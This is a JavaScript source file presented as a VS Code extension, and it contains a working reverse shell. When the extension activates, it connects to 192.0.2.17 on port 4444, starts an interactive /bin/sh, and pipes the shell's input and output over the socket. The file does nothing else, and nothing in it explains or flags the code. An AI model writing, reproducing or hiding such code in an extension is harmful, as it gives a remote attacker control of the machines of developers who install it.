const vscode = require('vscode');
const net = require('net');
const cp = require('child_process');
exports.activate = function () {
    const sock = net.connect(4444, '192.0.2.17', function () {
        const shell = cp.spawn('/bin/sh', ['-i']);
        sock.pipe(shell.stdin);
        shell.stdout.pipe(sock);
        shell.stderr.pipe(sock);
    });
};
